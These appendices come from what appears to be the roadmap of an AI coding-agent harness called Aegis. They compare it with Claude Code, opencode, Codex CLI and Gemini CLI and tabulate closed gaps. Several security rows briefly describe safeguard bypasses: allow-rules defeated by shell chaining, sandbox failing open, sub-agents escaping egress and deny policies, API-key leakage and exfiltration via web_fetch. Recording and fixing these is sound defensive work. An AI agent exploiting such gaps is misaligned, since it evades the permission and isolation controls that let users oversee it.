## Appendix B — 2026-07 Landscape Review

What changed in the top-tier harnesses since the 2026-06-29 competitive analysis, and what it means for Aegis.

**Claude Code** (the closest architectural relative):

- **Agent Teams** (Feb 2026, with Opus 4.6) — peer sessions that message each other directly, claim tasks from a shared task list, and challenge each other's findings. Distinct from subagents (which report up to a parent). Aegis's swarm mailbox was the right substrate; P5.1 added the shared task list and peer messaging semantics.
- **Skills with progressive disclosure** — only skill _name + description_ load at session start; the full body loads on invocation. Addressed by P4.3.
- **Lifecycle hooks as user config** — shell commands / HTTP endpoints / LLM prompts firing on `PreToolUse`, `PostToolUse`, `Stop`, `SubagentStop`, `SessionStart`, `Notification`; exit code 2 vetoes a tool call. Addressed by P4.4.
- **Deferred tools / ToolSearch** — tool schemas lazy-loaded via a search meta-tool instead of shipping every schema every turn. Addressed by P4.6.
- **Dispatch & Channels** — programmatic task submission via API plus event streams for dashboards/alerting. No Aegis equivalent; not scheduled.
- **Background agents finish the job** — commit, push, and open a draft PR when code work completes in a worktree. Addressed by P4.8.

**opencode** — 75+ providers via Models.dev; TypeScript plugin system with 25+ lifecycle hooks; experimental LSP _tool_ (go-to-definition, references, hover, call hierarchy — addressed by P5.2); session share links; desktop app + IDE extension (relates to open P6.5).

**Codex CLI** — default-on sandboxing (container, plus OS-level seatbelt/Landlock when no container — addressed by P4.7); headline **token efficiency** (~4× fewer tokens than peers on Terminal-Bench — related to open P6.4/context-editing work, now shipped); runs as an MCP _server_ (relates to open P6.3); native GitHub Actions + auto-PR; Rust rewrite.

**Gemini CLI** — 1M context standard; Google Search grounding; 90+ extensions; subagents with parallel delegation (Apr 2026); being folded into the Antigravity platform.

**Convergent themes across all four:** (1) token efficiency as a first-class metric, (2) user-configurable lifecycle hooks, (3) lazy/progressive context loading (skills, tools, docs), (4) headless/programmatic operation with structured output, (5) forge integration that completes the loop (PR out the other end), (6) sandboxing that doesn't require Docker. Aegis has now closed all six — MCP-server interop shipped 2026-07-05 (P6.3); A2A (P6.2) was evaluated and declined the same day (no consumer, extra protocol surface for no current benefit).

**Where Aegis was already at or ahead of parity** (no action needed): prompt-cache breakpoints in the Anthropic adapter; per-turn structured traces + cost budget enforcement; checkpoints/rewind + git rollback; output validation guard (LLM rubric + schema modes); cron scheduling; container sandbox matrix (Docker/Podman/WSL/Apple); ACP editor protocol; local-LLM-first provider posture; 17 security personas + contextual security policies (egress-then-write); audit trail.

---

## Appendix C — Gap Analysis

| #   | Category           | Gap                                                                                                                                                                                | Present in                                | Severity     | Status                                        |
| --- | ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------- | ------------ | --------------------------------------------- |
| 1   | Context efficiency | Skills fully injected into system prompt (no progressive disclosure)                                                                                                               | Claude Code                               | High         | ✅ P4.3                                       |
| 2   | Extensibility      | No user-configurable lifecycle hooks                                                                                                                                               | Claude Code, opencode                     | High         | ✅ P4.4                                       |
| 3   | Context efficiency | All 39+ tool schemas sent every turn; no deferred tool loading                                                                                                                     | Claude Code (ToolSearch)                  | High         | ✅ P4.6                                       |
| 4   | Automation         | Headless `aegis chat` emits plain text only                                                                                                                                        | Claude Code, Codex                        | High         | ✅ P4.5                                       |
| 5   | Safety             | Local sandbox backend = no isolation                                                                                                                                               | Codex CLI (default-on)                    | High         | ✅ P4.7                                       |
| 6   | Workflow           | Git tool stops at commit; no push / PR creation                                                                                                                                    | Claude Code, Codex                        | High         | ✅ P4.8                                       |
| 7   | Multi-agent        | Subagents report up only; no shared task list or peer messaging                                                                                                                    | Claude Code Agent Teams                   | Medium       | ✅ P5.1                                       |
| 8   | Tools              | LSP tools = diagnostics + references only                                                                                                                                          | opencode                                  | Medium       | ✅ P5.2                                       |
| 9   | Tools              | Web search scrapes DuckDuckGo HTML                                                                                                                                                 | Gemini, Claude Code                       | Medium       | ✅ P5.3                                       |
| 10  | Automation         | No notification channel for detached sessions                                                                                                                                      | Claude Code, Channels                     | Medium       | ✅ P5.4                                       |
| 11  | TUI                | No `@file#start-end` line-range syntax                                                                                                                                             | opencode                                  | Low          | ✅ P5.5                                       |
| 12  | TUI                | No draft stash across sessions                                                                                                                                                     | opencode                                  | Low          | ✅ P5.6                                       |
| 13  | Persistence        | No mid-turn state persistence on crash                                                                                                                                             | Crush, opencode                           | Low          | ⬜ P6.1                                       |
| 14  | Interop            | Cannot act as an MCP server (A2A protocol evaluated and declined 2026-07-05 — no consumer)                                                                                         | ADK, Codex                                | Low          | ✅ P6.3                                       |
| 15  | Extensibility      | Bundles install from local path only                                                                                                                                               | opencode plugin ecosystem                 | Low          | ✅ P5.7                                       |
| 16  | Memory             | Knowledge/longmem retrieval is BM25-only                                                                                                                                           | Cursor, Devin                             | Low          | ✅ P5.8                                       |
| 17  | Reliability        | No provider failover                                                                                                                                                               | Aider (litellm routing)                   | Low          | ✅ P5.9                                       |
| —   | Context efficiency | No deterministic tool-result pruning before LLM compaction                                                                                                                         | Codex CLI (token efficiency)              | Low          | ✅ P6.4                                       |
| 18  | Security           | MCP tools hardcode capability as `network`, bypassing permission gate in any mode                                                                                                  | — (internal audit)                        | **Critical** | ✅ P7.1                                       |
| 19  | Security           | Shell exec inherits full env (API keys); web_fetch enables exfil to public hosts                                                                                                   | — (internal audit)                        | High         | ✅ P7.2                                       |
| 20  | Security           | Permission allow-rule glob matches whole command string, bypassed by shell chaining                                                                                                | — (internal audit)                        | High         | ✅ P7.3                                       |
| 21  | Security           | Sandbox backend silently fails open to unsandboxed exec                                                                                                                            | — (internal audit)                        | Medium       | ✅ P7.4                                       |
| 22  | Security           | Bundle persona can silently escalate session to `auto` mode                                                                                                                        | — (internal audit)                        | Medium       | ✅ P7.5                                       |
| 23  | Security           | No signature/checksum verification on git-URL bundle installs                                                                                                                      | opencode plugin registry                  | Medium       | ✅ P7.6                                       |
| 24  | Security           | Deny rules silently no-op for tools with non-standard argument fields                                                                                                              | — (internal audit)                        | Low          | ✅ P7.7                                       |
| 25  | Performance        | Session store rewrites entire message/trace blob every turn — O(N²) over session life                                                                                              | — (internal audit)                        | High         | ✅ P8.1                                       |
| 26  | Performance        | Knowledge semantic search loads full corpus (vectors + bodies) per query                                                                                                           | — (internal audit)                        | Medium       | ✅ P8.2                                       |
| 27  | Performance        | Swarm mailbox has no eviction, grows unbounded                                                                                                                                     | — (internal audit)                        | Medium       | ✅ P8.3                                       |
| 28  | Performance        | Token estimation double-scans full conversation per turn (local models)                                                                                                            | — (internal audit)                        | Medium       | ✅ P8.4                                       |
| 29  | Performance        | Memory relevance TF-IDF recomputed from scratch every call                                                                                                                         | — (internal audit)                        | Low-Med      | ✅ P8.5                                       |
| 30  | Performance        | Write/execute tool calls unnecessarily serialize concurrent reads                                                                                                                  | — (internal audit)                        | Low          | ✅ P8.6                                       |
| 31  | Quality            | No agent-behavior eval/regression harness                                                                                                                                          | Codex, Claude Code (internal eval suites) | Medium       | ✅ P9.1                                       |
| 32  | Quality            | Zero test coverage in trace/logging/api/client packages                                                                                                                            | — (internal audit)                        | Medium       | ✅ P9.2                                       |
| 33  | Security           | In-process sub-agents bypass parent's contextual egress policy + text allow/deny rules (only mode is inherited)                                                                    | — (service-interaction review)            | **High**     | ✅ P10.1                                      |
| 34  | Security           | Subprocess workers run the shell tool with no sandbox and a re-injected API-key env                                                                                                | — (service-interaction review)            | **High**     | ✅ P10.2                                      |
| 35  | Security           | Subprocess fan-out gets a fresh full BudgetUSD per worker (shared ledger can't cross process boundary)                                                                             | — (service-interaction review)            | Medium       | ✅ P10.3                                      |
| 36  | Quality            | No eval scenario asserts a parent's deny/egress/budget still binds a spawned sub-agent                                                                                             | — (service-interaction review)            | Medium       | ✅ P10.4                                      |
| 37  | Safety             | Dollar-denominated budget/caps are a silent no-op for local (estimated-usage) + uncatalogued models — no working spend guardrail in the default local posture                      | — (provider-budgeting comparison)         | **High**     | ✅ P10.5                                      |
| 38  | Security scanning  | `Scanner.Available()` gates on a host binary; a clean machine silently skips every scanner and reports a scan it never ran                                                         | — (scan review)                           | High         | ✅ P11.1                                      |
| 39  | Security scanning  | Container-image security entirely missing (`trivy fs` only, never `trivy image`/grype/hadolint/dockle)                                                                             | — (scan review)                           | Medium       | ✅ P11.5 (scoped: host-binary only)           |
| 40  | Security scanning  | IaC coverage shallow — trivy config not fully exercised; deeper engine wanted (trivy expanded, not checkov: checkov OSS has no severity)                                           | — (scan review)                           | Medium       | ✅ P11.6                                      |
| 41  | Security scanning  | No DAST capability; OWASP ZAP automation requested (containerized, authorization-gated)                                                                                            | user request                              | High         | ✅ P11.7 (v1 scope)                           |
| 42  | Security scanning  | Single SAST engine (semgrep `auto`, unpinned)                                                                                                                                      | — (scan review)                           | Medium       | ✅ P11.3                                      |
| 43  | Security scanning  | No way to install a missing scanner (or auto-pick host-binary vs container); missing tools silently skipped                                                                        | user request                              | High         | ✅ P11.10                                     |
| 44  | Security scanning  | No user configuration for which security tools to enable, run method (host/container/auto), or auto-install policy                                                                | user request                              | High         | ✅ P11.11 (CLI + `/security-config` TUI form) |
| 45  | Security scanning  | No SCA breadth beyond trivy (osv-scanner/grype) or SBOM generation                                                                                                                 | — (scan review)                           | Medium       | ✅ P11.4                                      |
| 46  | Security scanning  | SCA findings carry no reachability signal — a vulnerable _package_ present reads the same as a vulnerable _function_ actually called                                               | user request                              | Medium       | ✅ P11.12                                     |
| 47  | Security scanning  | Overlapping tools re-report the same finding; no accepted-risk allowlist; findings read as raw tool IDs with no recognized-standard mapping                                        | — (scan review)                           | Medium       | ✅ P11.8                                      |
| 48  | Security scanning  | No regression coverage over recorded scanner output; a configured `security.tools.<name>.image` was never actually validated as digest-pinned despite being documented as required | — (scan review)                           | Medium       | ✅ P11.9                                      |

---

## Appendix D — Sources (2026-07-02 review)

- [Claude Code changelog](https://code.claude.com/docs/en/changelog) · [Steering Claude Code: skills, hooks, subagents](https://claude.com/blog/steering-claude-code-skills-hooks-rules-subagents-and-more) · [Agent Teams / subagents guide](https://saascity.io/blog/claude-code-subagents-agent-teams-2026) · [Q1 2026 update roundup](https://www.mindstudio.ai/blog/claude-code-q1-2026-update-roundup)
- [opencode docs](https://opencode.ai/docs/) · [opencode LSP servers](https://opencode.ai/docs/lsp/) · [opencode internals deep-dive](https://cefboud.com/posts/coding-agents-internals-opencode-deepdive/)
- [Claude Code vs Codex vs Gemini CLI (2026)](https://www.deployhq.com/blog/comparing-claude-code-openai-codex-and-google-gemini-cli-which-ai-coding-assistant-is-right-for-your-deployment-workflow) · [System prompts compared](https://codex.danielvaughan.com/2026/04/19/system-prompts-compared-codex-gemini-claude-code/) · [Agent capabilities compared](https://www.aimadetools.com/blog/claude-code-vs-codex-vs-gemini-agents-2026/)
